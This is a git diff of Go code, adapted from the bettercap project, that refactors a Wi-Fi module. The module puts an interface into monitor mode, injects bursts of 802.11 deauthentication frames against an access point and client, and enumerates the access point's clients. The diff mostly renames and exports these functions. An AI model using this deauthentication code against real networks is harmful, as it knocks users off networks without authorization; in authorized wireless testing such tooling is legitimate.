@@ -1,4 +1,11 @@
-package wifi
+/*
+*	The code in the following file is an extraction from the bettercap projct
+*	ALL CREDID GOES TO THEM
+*	Some functions received little modification to fit the need
+*	Including creating new function
+ */
+
+package wifi_common
 
 import (
 	"fmt"
@@ -13,8 +20,13 @@ import (
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
-	"github.com/mdlayher/wifi"
 )
+
+type Deauther struct {
+	InterfaceName string
+	ApMac         string
+	ClientMac     string
+}
 
 const (
 	PCAP_DEFAULT_SETRF   = false
@@ -33,26 +45,6 @@ var CAPTURE_DEFAULTS = CaptureOptions{
 	Timeout: PCAP_DEFAULT_TIMEOUT,
 }
 
-type WirelessInterface struct {
-	Index        int
-	Name         string
-	HardwareAddr string
-	PHY          int
-	Device       int
-	Type         wifi.InterfaceType
-	Frequency    int
-}
-
-type InterfaceName struct {
-	InterfaceName string
-}
-
-type Deauther struct {
-	InterfaceName string
-	ApMac         string
-	ClientMac     string
-}
-
 type CaptureOptions struct {
 	Monitor bool
 	Snaplen int
@@ -64,7 +56,7 @@ type CaptureOptions struct {
 type WiFiModule struct {
 	session.SessionModule
 	iface  *network.Endpoint
-	handle *pcap.Handle
+	Handle *pcap.Handle
 }
 
 func NewWiFiModule(ifaceName string) (*WiFiModule, error) {
@@ -85,7 +77,7 @@ func NewWiFiModule(ifaceName string) (*WiFiModule, error) {
 	opts.Monitor = true
 
 	for retry := 0; ; retry++ {
-		if mod.handle, err = CaptureWithOptions(ifaceName, opts); err == nil {
+		if mod.Handle, err = CaptureWithOptions(ifaceName, opts); err == nil {
 			// we're done
 			break
 		} else if retry == 0 && err.Error() == ErrIfaceNotUp {
@@ -111,7 +103,7 @@ func NewWiFiModule(ifaceName string) (*WiFiModule, error) {
 
 func (mod *WiFiModule) injectPacket(data []byte) {
 
-	if err := mod.handle.WritePacketData(data); err != nil {
+	if err := mod.Handle.WritePacketData(data); err != nil {
 		mod.Error("could not inject WiFi packet: %s", err)
 		//mod.Session.Queue.TrackError()
 	} else {
@@ -123,7 +115,7 @@ func (mod *WiFiModule) injectPacket(data []byte) {
 	time.Sleep(10 * time.Millisecond)
 }
 
-func (mod *WiFiModule) sendDeauthPacket(ap net.HardwareAddr, client net.HardwareAddr) {
+func (mod *WiFiModule) SendDeauthPacket(ap net.HardwareAddr, client net.HardwareAddr) {
 
 	for seq := uint16(0); seq < 64; seq++ {
 		if err, pkt := packets.NewDot11Deauth(ap, client, ap, seq); err != nil {
@@ -181,7 +173,7 @@ func CaptureWithTimeout(ifName string, timeout time.Duration) (*pcap.Handle, err
 	return CaptureWithOptions(ifName, opts)
 }
 
-func findApClients(apMac net.HardwareAddr, handle *pcap.Handle) (clients []*network.Station) {
+func FindApClients(apMac net.HardwareAddr, handle *pcap.Handle) (clients []*network.Station) {
 
 	src := gopacket.NewPacketSource(handle, handle.LinkType())
 	pktSourceChan := src.Packets()
